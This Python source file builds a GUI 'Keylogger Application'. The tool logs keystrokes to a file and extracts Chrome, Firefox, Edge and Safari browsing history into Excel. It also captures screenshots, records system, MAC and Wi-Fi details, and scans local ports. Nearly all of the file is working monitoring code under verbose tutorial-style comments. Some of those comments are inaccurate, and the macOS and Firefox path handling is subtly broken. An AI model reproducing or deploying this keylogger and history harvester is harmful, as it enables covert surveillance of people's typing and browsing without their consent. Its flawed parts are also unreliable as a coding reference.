import datetime
#The datetime module is essential for working with date and time data in Python. 
#It allows you to manipulate timestamps, calculate time intervals, and format dates in a readable way. 
#In this code, it is used to convert timestamps from web browser histories (stored as integers) into 
#human-readable datetime objects, so that users can understand when they visited a particular website. 
#The module also allows you to perform date-related operations, such as converting or formatting dates.

import os
#The os module provides a way to interact with the operating system, including file and directory operations. 
#In this script, it is used to construct file paths, check for file existence, and navigate through the file 
#system. For example, it helps retrieve the locations of browser history files on different platforms (Windows, macOS, Linux) 
#by dynamically adjusting file paths. It also helps in handling user directories and setting environment variables like %LOCALAPPDATA%.

import platform
#The platform module is used to access platform-specific information about the operating system. This is crucial in this code, as it 
#enables the program to adapt its behavior based on whether the user is running the application on Windows, macOS, or Linux. 
#For example, different browsers store history data in different file locations depending on the OS. The platform module allows 
#the program to dynamically choose the correct path for each system.

import socket
#The socket module is used for networking tasks. It allows you to work with network connections, retrieve hostnames, IP addresses, 
#and manage sockets for communication. In this code, it is likely used for tasks such as retrieving the local machine's IP address 
#or testing network connectivity. While not explicitly used in the shown code, it could be utilized for tasks like network diagnostics 
#or communicating over a network if expanded.

import pandas as pd
#The pandas library is used for data manipulation and analysis, particularly with tabular data (like CSV files or databases). 
#In this script, it is used to handle and structure the browser history data in a tabular format, which is then saved to Excel files. 
#By converting the raw browser history data into a DataFrame, it makes the data easier to analyze, filter, and export to various formats, such as Excel, CSV, or JSON.

import uuid
#The uuid module is used to generate universally unique identifiers (UUIDs). In this script, it is primarily used to retrieve the MAC address of the local machine. 
#The MAC address, which is a unique identifier assigned to network interfaces, can be useful for system identification, logging, or networking tasks. 
#The uuid.getnode() function is used to get the hardware address of the device, typically the MAC address.

import subprocess
#The subprocess module is used to run system-level commands from within a Python script. It allows for execution of external programs, capturing their output, 
#and handling their return codes. In this case, subprocess could be used for tasks such as retrieving system information (e.g., Wi-Fi details) or interacting with 
#network tools and utilities. It can help automate tasks that would otherwise require manually running shell commands.

import tkinter as tk
#The tkinter module provides a simple way to create graphical user interfaces (GUIs) in Python. It is part of the standard library and helps to build windows, buttons, 
#labels, and other interactive elements. In this script, tkinter is used to build a GUI for the program, allowing the user to interact with the tool via buttons, messages, 
#and other visual components. It makes the program more user-friendly and accessible, especially for users who are not comfortable using the command line.

from tkinter import messagebox, StringVar, ttk
#This import brings in specific components of tkinter that are useful for various GUI tasks. The `messagebox` module enables the creation of pop-up dialog boxes to 
#display messages, warnings, and errors, enhancing user interaction by providing feedback. The `StringVar` class is a variable type in tkinter that manages string data 
#within the GUI, allowing dynamic updates in widgets such as labels or text fields. Additionally, `ttk` is a submodule of tkinter that offers themed widgets like Combobox, 
#Treeview, and Progressbar, which provide a more modern and visually appealing look compared to the default tkinter widgets.

from PIL import ImageGrab
#The PIL (Python Imaging Library) module is used for image processing tasks. The ImageGrab class allows you to capture screenshots of the screen or parts of it. 
#In this code, ImageGrab.grab() is likely used to take screenshots of the desktop or specific applications, which can be useful for monitoring activities, 
#logging system status, or creating a visual record of user actions.

from pynput.keyboard import Key, Listener
#The pynput module is used for monitoring and controlling input devices such as keyboards and mice. In this script, it is used to listen for keyboard events, 
#enabling the program to record keystrokes. The Listener class listens for specific key events, and actions can be taken when certain keys are pressed. 
#This feature is commonly used in keyloggers or similar monitoring tools, but it also requires careful ethical consideration.

import concurrent.futures
#The concurrent.futures module simplifies the process of concurrent programming by allowing you to execute tasks asynchronously. In this script, it is used 
#for parallelizing the port scanning process, so that multiple ports can be scanned simultaneously rather than sequentially. This makes the process much faster, 
#particularly when dealing with a large number of ports or network connections.

import re
#The re module is used for working with regular expressions, which allow you to search for patterns within strings, such as matching IP addresses, MAC addresses, or URLs. 
#In this script, it might be used to extract network-related details from text output or to validate the format of certain values, ensuring that they conform to expected 
#patterns before further processing.

import sqlite3 
#The sqlite3 module provides an interface for interacting with SQLite databases, which are lightweight, serverless databases stored in a single file. In this script, it is 
#used to query browser history databases (like Chrome, Firefox, Safari, and Edge) and retrieve user browsing data. By using sqlite3, the program can directly access these 
#databases, execute SQL queries, and collect relevant browsing history to analyze or export.

# Constants for file paths
#The log_file constant is used to define the path of the text file (logs.txt) where system activity or logs will be recorded. The computer_info_excel_file constant specifies 
#the path of an Excel file (computerInfo.xlsx) where collected computer information, such as system specs and network details, will be saved in a structured format for easy 
#reference and analysis. The screenshot_dir constant defines the directory (screenshots) where screenshots of the user's screen will be saved. To ensure the directory exists 
#before screenshots are captured, the os.makedirs(screenshot_dir, exist_ok=True) command is used, which creates the directory if it doesn't already exist. Finally, 
#the port_scan_excel_file constant specifies the path of an Excel file (port_scan_results.xlsx) that will store the results of a port scan, likely including details of open 
#ports or network services detected during the scan. These constants help organize the file system structure, ensuring that all data is saved to the appropriate locations for 
#later use or analysis.

log_file = "logs.txt"
computer_info_excel_file = 'computerInfo.xlsx'
screenshot_dir = "screenshots"
os.makedirs(screenshot_dir, exist_ok=True)
port_scan_excel_file = 'port_scan_results.xlsx' 

# Browser history paths
#The `get_chrome_history_path` function identifies and returns the file path for Google Chrome's browsing history database based on the operating system running the code. 
#It uses Python's `platform.system()` function to determine if the OS is Windows, Mac, or Linux, and then provides the appropriate Chrome history file path for that system. 
#On Windows, it utilizes `os.path.expandvars` to access the `%LOCALAPPDATA%` environment variable, pointing to `Google\Chrome\User Data\Default\History`. For Mac, it uses `os.path.expanduser` 
#to locate Chrome's history in the user's `Library/Application Support/Google/Chrome/Default/History` directory, while for Linux, it also uses `os.path.expanduser` to access the `.config/google-chrome/Default/History` 
#path within the user’s home directory. If the OS is unsupported, the function simply returns `None`. This design is especially useful for cross-platform scripts that need to directly access Chrome’s browsing history.
def get_chrome_history_path():
    if platform.system() == "Windows":
        return os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
    elif platform.system() == "Mac":
        return os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
    elif platform.system() == "Linux":
        return os.path.expanduser('~/.config/google-chrome/Default/History')
    return None

def get_firefox_history_path():
    if platform.system() == "Windows":
        return os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\places.sqlite')
    elif platform.system() == "Mac":
        return os.path.expanduser('~/Library/Application Support/Firefox/Profiles/*.default-release/places.sqlite')
    elif platform.system() == "Linux":
        return os.path.expanduser('~/.mozilla/firefox/*.default-release/places.sqlite')
    return None

def get_edge_history_path():
    if platform.system() == "Windows":
        return os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History')
    elif platform.system() == "Mac":
        return os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/History')
    elif platform.system() == "Linux":
        return os.path.expanduser('~/.config/microsoft-edge/Default/History')
    return None

# Function to get Safari history from the SQLite database
#The `get_safari_history` function retrieves browsing history data from Safari by connecting to its history database file, 
#`History.db`. The function first constructs the path to the history file within the user's `Library/Safari` directory using 
#`os.path.expanduser`. If this file does not exist, it prints an error message and returns an empty list. Otherwise, it attempts 
#to open a connection to the database file using SQLite. After establishing the connection, it queries the `history_items` table 
#to retrieve the URL, title, visit count, and visit time of each visited page. The function then fetches all the query results and 
#iterates through each row, converting each entry into a dictionary containing the URL, title, visit count, and a human-readable visit time. 
#The visit time is converted from Safari's custom timestamp format (counted from January 1, 2001) to a standard date and time format using 
#`datetime.timedelta`. After collecting this information into a list of dictionaries, it closes the database connection and returns the structured 
#history data. In the event of an error while accessing the database, the function prints an error message and returns an empty list.
def get_safari_history():
    history_path = os.path.expanduser('~/Library/Safari/History.db')

    if not os.path.exists(history_path):
        print("Safari history file not found.")
        return []

    try:
        # Connect to the SQLite database
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()

        # Query the history_items table for URL and visit_time
        query = """
        SELECT history_items.url, history_items.title, history_items.visit_count, history_items.visit_time 
        FROM history_items;
        """
        cursor.execute(query)
        
        # Fetch all results
        history = cursor.fetchall()

        # Convert results to a list of dictionaries
        history_data = []
        for row in history:
            url, title, visit_count, visit_time = row
            # Convert visit_time to readable datetime (Safari uses Mac timestamp format)
            visit_time = datetime.datetime(2001, 1, 1) + datetime.timedelta(seconds=visit_time)
            history_data.append({
                'URL': url,
                'Title': title,
                'Visit Count': visit_count,
                'Visit Time': visit_time
            })

        # Close the connection
        conn.close()

        # Return the history data
        return history_data

    except sqlite3.Error as e:
        print(f"Error reading Safari history: {e}")
        return []

# Function to save Safari history to an Excel file
#The `save_safari_history_to_excel` function saves Safari browsing history data to an Excel file. 
#It begins by calling the `get_safari_history` function to retrieve Safari’s history data. 
#If `get_safari_history` returns an empty result (indicating no data or an error accessing the 
#database), it displays a warning message using a `messagebox` and exits the function. If history 
#data is available, the function proceeds by converting the data into a Pandas DataFrame, a tabular 
#data structure ideal for organizing and exporting data. The function then saves this DataFrame to 
#an Excel file named `safari_history.xlsx` without including row indices. After successfully saving 
#the file, it displays a confirmation message to inform the user that Safari history has been saved 
#to `safari_history.xlsx`.
def save_safari_history_to_excel():
    history_data = get_safari_history()

    if not history_data:
        messagebox.showwarning("No History", "No Safari history found or cannot access the database.")
        return

    # Convert to DataFrame and save to Excel
    df = pd.DataFrame(history_data)
    df.to_excel('safari_history.xlsx', index=False)
    messagebox.showinfo("Safari History", "Safari history saved to safari_history.xlsx.")

# Function to get Chrome history from the SQLite database
#The `get_chrome_history` function retrieves browsing history data from Google Chrome’s history database. 
#It first determines the database file path by calling `get_chrome_history_path`. If the file path is invalid or the file 
#does not exist, it prints an error message and returns an empty list. Otherwise, it tries to connect to the history database 
#using SQLite. Once connected, the function queries the database by joining the `urls` and `visits` tables 
#to retrieve information about each visited page, including the URL, title, visit count, and visit time. It fetches all the 
#results from the query and iterates over them, storing each entry in a dictionary format with `URL`, `Title`, `Visit Count`, 
#and `Visit Time` fields. The `Visit Time` is converted from Chrome’s timestamp format (which starts from January 1, 1601) to a 
#standard date and time using `datetime.timedelta`. After processing all entries, it closes the database connection and returns 
#the formatted history data. If an error occurs while reading the database, it prints an error message and returns an empty list.
def get_chrome_history():
    history_path = get_chrome_history_path()

    if not history_path or not os.path.exists(history_path):
        print("Chrome history file not found.")
        return []

    try:
        # Connect to the SQLite database
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()

        # Query the history table
        query = "SELECT urls.url, urls.title, urls.visit_count, visits.visit_time FROM urls, visits WHERE urls.id = visits.url;"
        cursor.execute(query)
        
        # Fetch all results
        history = cursor.fetchall()

        # Convert results to a list of dictionaries
        history_data = []
        for row in history:
            url, title, visit_count, visit_time = row
            history_data.append({
                'URL': url,
                'Title': title,
                'Visit Count': visit_count,
                'Visit Time': datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=visit_time)
            })

        # Close the connection
        conn.close()

        # Return the history data
        return history_data

    except sqlite3.Error as e:
        print(f"Error reading Chrome history: {e}")
        return []

# Function to get Firefox history from the SQLite database
def get_firefox_history():
    history_path = get_firefox_history_path()

    if not history_path or not os.path.exists(history_path):
        print("Firefox history file not found.")
        return []

    try:
        # Connect to the SQLite database
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()

        # Query the history table
        query = "SELECT url, title, visit_count, last_visit_date FROM moz_places;"
        cursor.execute(query)
        
        # Fetch all results
        history = cursor.fetchall()

        # Convert results to a list of dictionaries
        history_data = []
        for row in history:
            url, title, visit_count, last_visit_date = row
            # Convert timestamp to readable datetime
            visit_time = datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=last_visit_date)
            history_data.append({
                'URL': url,
                'Title': title,
                'Visit Count': visit_count,
                'Visit Time': visit_time
            })

        # Close the connection
        conn.close()

        # Return the history data
        return history_data

    except sqlite3.Error as e:
        print(f"Error reading Firefox history: {e}")
        return []

# Function to get Microsoft Edge history from the SQLite database
def get_edge_history():
    history_path = get_edge_history_path()

    if not history_path or not os.path.exists(history_path):
        print("Edge history file not found.")
        return []

    try:
        # Connect to the SQLite database
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()

        # Query the history table
        query = "SELECT urls.url, urls.title, urls.visit_count, visits.visit_time FROM urls, visits WHERE urls.id = visits.url;"
        cursor.execute(query)
        
        # Fetch all results
        history = cursor.fetchall()

        # Convert results to a list of dictionaries
        history_data = []
        for row in history:
            url, title, visit_count, visit_time = row
            history_data.append({
                'URL': url,
                'Title': title,
                'Visit Count': visit_count,
                'Visit Time': datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=visit_time)
            })

        # Close the connection
        conn.close()

        # Return the history data
        return history_data

    except sqlite3.Error as e:
        print(f"Error reading Edge history: {e}")
        return []

# Function to save Chrome history to an Excel file
#The `save_chrome_history_to_excel` function retrieves and saves Google Chrome's browsing history to an Excel file. 
#It begins by calling `get_chrome_history`, which fetches Chrome’s browsing data by reading its history 
#database. If `get_chrome_history` returns an empty result, indicating there is no history data or an issue accessing the 
#database, the function displays a warning message box to inform the user that no data could be found and then exits.

#If browsing history data is available, the function converts this data into a Pandas DataFrame, a data structure well-suited 
#for handling tabular data and supporting various export options. It then saves this DataFrame to an Excel 
#file named `chrome_history.xlsx` without row indices. After the file is saved successfully, the function uses an information 
#message box to confirm that the Chrome history has been saved. This process allows users to store Chrome history 
#in an easily accessible format for viewing or analysis.
def save_chrome_history_to_excel():
    history_data = get_chrome_history()
    
    if not history_data:
        messagebox.showwarning("No History", "No Chrome history found or cannot access the database.")
        return

    # Convert to DataFrame and save to Excel
    df = pd.DataFrame(history_data)
    df.to_excel('chrome_history.xlsx', index=False)
    messagebox.showinfo("Chrome History", "Chrome history saved to chrome_history.xlsx.")

# Function to save Firefox history to an Excel file
def save_firefox_history_to_excel():
    history_data = get_firefox_history()
    
    if not history_data:
        messagebox.showwarning("No History", "No Firefox history found or cannot access the database.")
        return

    # Convert to DataFrame and save to Excel
    df = pd.DataFrame(history_data)
    df.to_excel('firefox_history.xlsx', index=False)
    messagebox.showinfo("Firefox History", "Firefox history saved to firefox_history.xlsx.")

# Function to save Edge history to an Excel file
def save_edge_history_to_excel():
    history_data = get_edge_history()
    
    if not history_data:
        messagebox.showwarning("No History", "No Edge history found or cannot access the database.")
        return

    # Convert to DataFrame and save to Excel
    df = pd.DataFrame(history_data)
    df.to_excel('edge_history.xlsx', index=False)
    messagebox.showinfo("Edge History", "Edge history saved to edge_history.xlsx.")

# Function to scan Wi-Fi and retrieve detailed network information
#The `scan_wifi_info` function retrieves Wi-Fi network details, such as IP address, MAC address, gateway, and DNS servers, 
#based on the operating system. It starts by creating an empty dictionary, `wifi_info`, to store the network information. 
#If the system is Windows, it uses the `ipconfig /all` command to gather network details. The function then employs regular 
#expressions to extract the IP address, MAC address, default gateway, and DNS servers from the command output. For Linux, 
#it uses the `nmcli` command with specific parameters to get the IP address, hardware MAC address, and gateway, again using 
#regular expressions to match and capture these details. On macOS, the `ifconfig en0` command is used to retrieve similar 

#information, with regular expressions applied to parse out the IP address, MAC address, and gateway from the output.
#If the `subprocess` call fails, a `CalledProcessError` exception is caught, and an error message is printed and stored in 
#`wifi_info`. If a required command-line utility is missing, a `FileNotFoundError` exception is handled similarly by printing 
#an error and updating `wifi_info` with the error message. Finally, the function prints the complete Wi-Fi information stored 
#in `wifi_info` and returns this dictionary, providing network details in a standardized format across different operating systems.
def scan_wifi_info():
    wifi_info = {}

    try:
        if platform.system() == "Windows":
            # Run ipconfig command to get network info
            result = subprocess.run("ipconfig /all", capture_output=True, text=True, shell=True)
            result.check_returncode()  # Raise an error if the subprocess fails
            output = result.stdout

            # Extract Wi-Fi information using regex for BSSID, IP, and other details
            ip_pattern = re.compile(r"IPv4 Address[ .]*: ([\d\.]+)")
            mac_pattern = re.compile(r"Physical.*: ([\w\-]+)")
            gateway_pattern = re.compile(r"Default Gateway[ .]*: ([\d\.]+)")
            dns_pattern = re.compile(r"DNS Servers[ .]*: ([\d\.]+)")

            ip_address = ip_pattern.search(output)
            mac_address = mac_pattern.search(output)
            gateway = gateway_pattern.search(output)
            dns_servers = dns_pattern.findall(output)

            if ip_address:
                wifi_info["IP Address"] = ip_address.group(1)
            if mac_address:
                wifi_info["MAC Address"] = mac_address.group(1)
            if gateway:
                wifi_info["Default Gateway"] = gateway.group(1)
            if dns_servers:
                wifi_info["DNS Servers"] = dns_servers

        elif platform.system() == "Linux":
            # Run `ifconfig` or `nmcli` to get Wi-Fi and network details
            result = subprocess.run(["nmcli", "-t", "-f", "IP4.ADDRESS,GENERAL.HWADDR,GATEWAY", "device", "show", "wlan0"],
                                    capture_output=True, text=True)
            result.check_returncode()
            output = result.stdout

            # Extract relevant network information
            ip_pattern = re.compile(r"IP4.ADDRESS: ([\d\.]+)")
            mac_pattern = re.compile(r"GENERAL.HWADDR: ([\w:]+)")
            gateway_pattern = re.compile(r"GATEWAY: ([\d\.]+)")

            ip_address = ip_pattern.search(output)
            mac_address = mac_pattern.search(output)
            gateway = gateway_pattern.search(output)

            if ip_address:
                wifi_info["IP Address"] = ip_address.group(1)
            if mac_address:
                wifi_info["MAC Address"] = mac_address.group(1)
            if gateway:
                wifi_info["Default Gateway"] = gateway.group(1)

        elif platform.system() == "Darwin":
            # macOS - Use the `ifconfig` command to get detailed network info
            result = subprocess.run("ifconfig en0", capture_output=True, text=True, shell=True)
            result.check_returncode()
            output = result.stdout

            # Extract relevant network information
            ip_pattern = re.compile(r"inet (\d+\.\d+\.\d+\.\d+)")
            mac_pattern = re.compile(r"ether ([a-f0-9:]+)")
            gateway_pattern = re.compile(r"gateway (\d+\.\d+\.\d+\.\d+)")

            ip_address = ip_pattern.search(output)
            mac_address = mac_pattern.search(output)
            gateway = gateway_pattern.search(output)

            if ip_address:
                wifi_info["IP Address"] = ip_address.group(1)
            if mac_address:
                wifi_info["MAC Address"] = mac_address.group(1)
            if gateway:
                wifi_info["Default Gateway"] = gateway.group(1)

    except subprocess.CalledProcessError as e:
        print(f"Error occurred while scanning Wi-Fi information: {e}")
        wifi_info["Error"] = f"Error: {e}"

    except FileNotFoundError:
        print("Error: The required command-line utility is not available.")
        wifi_info["Error"] = "Error: Utility not found."

    # Return or print the detailed Wi-Fi information
    print(f"Wi-Fi Information: {wifi_info}")
    return wifi_info

# MAC address retrieval
#The `get_mac_address` function retrieves the MAC address of the current machine and logs it. It begins by using 
#the `uuid.getnode()` method to obtain the hardware address as a 48-bit integer. This integer is then processed using a 
#list comprehension to format it as a string of six pairs of hexadecimal digits, separated by colons, matching the standard 
#MAC address format. The function then opens a log file (defined as `log_file`) in append mode and writes the MAC address 
#to it. It also prints the MAC address to the console for immediate display. Finally, 
#the function returns the formatted MAC address as its output. This approach enables easy retrieval, display, and logging 
#of the device’s MAC address.
def get_mac_address():
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 2*6, 8)][::-1])
    with open(log_file, "a") as f:
        f.write(f"MAC Address: {mac_addr}\n")
    print("MAC Address:", mac_addr)
    return mac_addr

# Open port scanning (using threading)
#The `scan_ports` function scans for open ports on the "localhost" host and logs the results into an Excel file. It starts 
#by initializing an empty list, `open_ports`, to store any open ports found during the scan. Inside the function, a nested 
#helper function `check_port` is defined, which takes a port number as an argument. This function creates a socket object using 
#IPv4 (`AF_INET`) and TCP (`SOCK_STREAM`), then attempts to connect to the specified port on the host with a 1-second timeout 
#to prevent delays. If the connection is successful (resulting in `result == 0`), the port is considered open, and the port 
#number is returned. Otherwise, `None` is returned.

#The `scan_ports` function uses a `ThreadPoolExecutor` to scan ports concurrently, improving efficiency by scanning multiple 
#ports in parallel. It submits a task for each port in the range from 1 to 1024 and collects the results as they are completed. 
#If a port is open (i.e., the result is not `None`), it is appended to the `open_ports` list.

#After scanning, the function logs the open ports to a new Excel file by creating a dictionary where the `Port` field contains 
#the open port numbers and the `Host` field is populated with the "localhost" address for each open port. This data is converted 
#into a Pandas DataFrame and saved to an Excel file. The function prints a confirmation message and returns the list of open ports.
def scan_ports():
    host = "localhost"  # Target host for scanning
    open_ports = []
    
    # Function to check if a port is open
    def check_port(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)  # Set timeout to 1 second to avoid long delays
            result = s.connect_ex((host, port))
            if result == 0:  # Port is open
                return port
            return None

    # Scan ports in parallel using ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(check_port, port) for port in range(1, 1025)]  # Scanning ports 1 to 1024
        
        for future in concurrent.futures.as_completed(futures):
            port = future.result()
            if port is not None:
                open_ports.append(port)
    
    # Log the open ports to a new Excel file
    data = {
        'Port': open_ports,
        'Host': [host] * len(open_ports)
    }
    df = pd.DataFrame(data)
    df.to_excel(port_scan_excel_file, index=False)
    print(f"Open ports saved to {port_scan_excel_file}.")
    
    return open_ports

# Computer information logging
#The `log_computer_info` function collects and logs basic system information about the computer, saving it to an Excel file. 
#It first creates a dictionary, `data`, with two keys: `Metric` and `Value`. The `Metric` key contains a 
#list of labels for the system information to be collected, including the current date, IP address, processor type, operating system, 
#release version, and host name. The `Value` key holds the corresponding values for each metric: 
#the current date is retrieved using `datetime.date.today()`, the IP address is obtained using 
#`socket.gethostbyname(socket.gethostname())`, and the processor, system, release, and host name details are retrieved 
#using `platform.processor()`, `platform.system()`, `platform.release()`, and `socket.gethostname()`, respectively.

#Next, the data is converted into a Pandas DataFrame, which organizes the collected information in tabular form. The 
#DataFrame is then saved to an Excel file, with the file name specified by the `computer_info_excel_file` variable. 
#Finally, the function prints a confirmation message, "Computer info logged," indicating that the system information has 
#been successfully saved. This function helps capture and store key system details for later reference or analysis.
def log_computer_info():
    data = {
        'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
        'Value': [
            datetime.date.today(),
            socket.gethostbyname(socket.gethostname()),
            platform.processor(),
            platform.system(),
            platform.release(),
            socket.gethostname()
        ]
    }
    df = pd.DataFrame(data)
    df.to_excel(computer_info_excel_file, index=False)
    print("Computer info logged.")

# Screenshot logging with unique filenames
#The `take_screenshot` function captures a screenshot of the current screen and saves it to a specified directory. 
#It starts by generating a timestamp using `datetime.datetime.now().strftime("%Y%m%d_%H%M%S")`, 
#which formats the current date and time as a string (e.g., "20241110_120530"). This timestamp is used to create a 
#unique filename for the screenshot. The function then constructs the full file path for the screenshot 
#by joining the `screenshot_dir` directory with the generated filename using `os.path.join`.

#Next, the function uses the `ImageGrab.grab()` method from the PIL (Pillow) library to capture the screenshot. 
#The screenshot image is then saved to the specified path using the `im.save(screenshot_path)` method. 
#Finally, the function prints a confirmation message, including the full path of the saved screenshot, indicating that 
#the screenshot has been successfully taken and saved. This function provides a simple way to 
#capture and store screenshots with unique filenames based on the timestamp.
def take_screenshot():
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
    im = ImageGrab.grab()
    im.save(screenshot_path)
    print(f"Screenshot taken: {screenshot_path}")

# Keystroke logging
#The `Keylogger` class is designed to capture and log keystrokes on the system. When an instance of the class is created, 
#the `__init__` method initializes an empty list, `keys`, to store the pressed keys, and a `listener` attribute set 
#to `None` to manage the key listener. The `on_press` method is called whenever a key is pressed, and it appends the key 
#(after removing the surrounding single quotes) to the `keys` list. The `on_release` method checks if the Escape key 
#(`Key.esc`) has been released, and if so, it triggers the `write_to_file` method to save the captured keystrokes to a file. 
#It then prints "Exiting Keylogger" and returns `False` to stop the listener and exit the keylogger.

#The `write_to_file` method opens the specified `log_file` in append mode, writes the accumulated keystrokes 
#(separated by spaces) as a single string, followed by a newline, and then clears the `keys` list to prepare for the next batch of 
#keystrokes. The `start` method creates a `Listener` from the `pynput` library, which listens for key presses and releases. 
#It assigns the `on_press` and `on_release` methods as event handlers and starts the listener. Finally, the `stop` method 
#stops the listener if it is active, effectively halting the keylogger. This class is used to monitor and record keystrokes 
#while allowing periodic saving of the captured data to a file.
class Keylogger:
    def __init__(self):
        self.keys = []
        self.listener = None

    def on_press(self, key):
        self.keys.append(str(key).replace("'", ""))

    def on_release(self, key):
        if key == Key.esc:
            self.write_to_file()
            print("Exiting Keylogger.")
            return False

    def write_to_file(self):
        with open(log_file, "a") as f:
            f.write(" ".join(self.keys) + "\n")
            self.keys = []

    def start(self):
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()

# GUI Application
#The `KeyloggerApp` class is a graphical user interface (GUI) application built using the Tkinter library that allows users 
#to control various monitoring and logging functionalities. Upon initialization, it sets up the main window with a title, 
#size, and background color, and it creates an instance of the `Keylogger` class to handle keystroke logging. The app 
#includes several buttons for different features. Two buttons control the keylogger, with the "Start Keylogger" button 
#starting the keylogger and the "Stop Keylogger" button stopping it. Additional buttons provide functionality for logging 
#computer information, taking screenshots, and scanning open ports, each triggering the corresponding method when clicked. 
#There is also a button to scan and display Wi-Fi information, showing the details in a popup message box if available. 
#The app allows users to select a browser (Chrome, Firefox, Edge, or Safari) from a dropdown menu and then save the selected 
#browser's history to an Excel file when the "Save Browser History" button is clicked. Finally, a "Quit" button is provided 
#to exit the application. Each button is linked to a specific action, such as scanning Wi-Fi details, logging computer 
#information, saving browser history, or starting and stopping the keylogger. The interface is simple and intuitive, making 
#it easy for users to interact with the app's various features.
class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger Application")
        master.geometry("400x600")
        master.configure(bg='#f0f0f0')

        self.keylogger = Keylogger()

        # Create a frame for buttons
        button_frame = tk.Frame(master, bg='#f0f0f0')
        button_frame.pack(pady=20)

        # Keylogger buttons
        self.start_button = tk.Button(button_frame, text="Start Keylogger", command=self.start_keylogger, width=20, bg='#4CAF50', fg='white')
        self.start_button.grid(row=0, column=0, padx=10, pady=10)
        self.stop_button = tk.Button(button_frame, text="Stop Keylogger", command=self.stop_keylogger, width=20, bg='#F44336', fg='white')
        self.stop_button.grid(row=0, column=1, padx=10, pady=10)

        # Other logging buttons
        self.log_button = tk.Button(master, text="Log Computer Info", command=log_computer_info, width=20, bg='#2196F3', fg='white')
        self.log_button.pack(pady=10)
        self.screenshot_button = tk.Button(master, text="Take Screenshot", command=take_screenshot, width=20, bg='#2196F3', fg='white')
        self.screenshot_button.pack(pady=10)

        # Port scanning
        self.scan_ports_button = tk.Button(master, text="Scan Open Ports", command=self.scan_ports_button_action, width=20, bg='#FF5722', fg='white')
        self.scan_ports_button.pack(pady=10)

        # Wi-Fi Information button
        self.scan_wifi_button = tk.Button(master, text="Scan Wi-Fi Info", command=self.scan_wifi_button_action, width=20, bg='#673AB7', fg='white')
        self.scan_wifi_button.pack(pady=10)

        # Browser history dropdown
        self.browser_var = StringVar()
        self.browser_combobox = ttk.Combobox(master, textvariable=self.browser_var, state="readonly", width=20)
        self.browser_combobox['values'] = ("Chrome", "Firefox", "Edge", "Safari")
        self.browser_combobox.set("Select Browser")
        self.browser_combobox.pack(pady=10)

        # Save browser history button
        self.save_history_button = tk.Button(master, text="Save Browser History", command=self.save_browser_history, width=20, bg='#009688', fg='white')
        self.save_history_button.pack(pady=10)

        self.quit_button = tk.Button(master, text="Quit", command=master.quit, width=20, bg='#FF9800', fg='white')
        self.quit_button.pack(pady=20)

    def start_keylogger(self):
        self.keylogger.start()

    def stop_keylogger(self):
        self.keylogger.stop()

    def scan_wifi_button_action(self):
        wifi_info = scan_wifi_info()  # Call the function to scan for Wi-Fi info
        if wifi_info:
            wifi_info_str = "\n".join([f"{key}: {value}" for key, value in wifi_info.items()])
            messagebox.showinfo("Wi-Fi Information", wifi_info_str)
        else:
            messagebox.showwarning("No Wi-Fi Info", "No Wi-Fi info available.")

    def scan_ports_button_action(self):
        open_ports = scan_ports()
        if open_ports:
            messagebox.showinfo("Open Ports", f"Open ports: {open_ports}")
        else:
            messagebox.showwarning("No Open Ports", "No open ports found.")

    def save_browser_history(self):
        selected_browser = self.browser_var.get()

        if selected_browser == "Chrome":
            save_chrome_history_to_excel()
        elif selected_browser == "Firefox":
            save_firefox_history_to_excel()
        elif selected_browser == "Edge":
            save_edge_history_to_excel()
        elif selected_browser == "Safari":
            save_safari_history_to_excel()
        else:
            messagebox.showwarning("No Selection", "Please select a browser.")

# Run the application
#The code block initiates the application by first checking if the script is being run as the main program using the 
#`if __name__ == "__main__":` condition. This ensures that the following code runs only when the script is executed 
#directly and not when imported as a module. Inside this block, a Tkinter root window (`root`) is created by 
#calling `tk.Tk()`, which serves as the main window for the application. Then, an instance of the `KeyloggerApp` class is created, 
#passing the `root` window as an argument, which sets up the graphical user interface (GUI) for the keylogger application. 
#Finally, `root.mainloop()` is called, which starts the Tkinter event loop, allowing the application to run and respond to 
#user inputs, such as clicking buttons and interacting with the GUI. This loop keeps the application active until the user 
#closes the window.
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()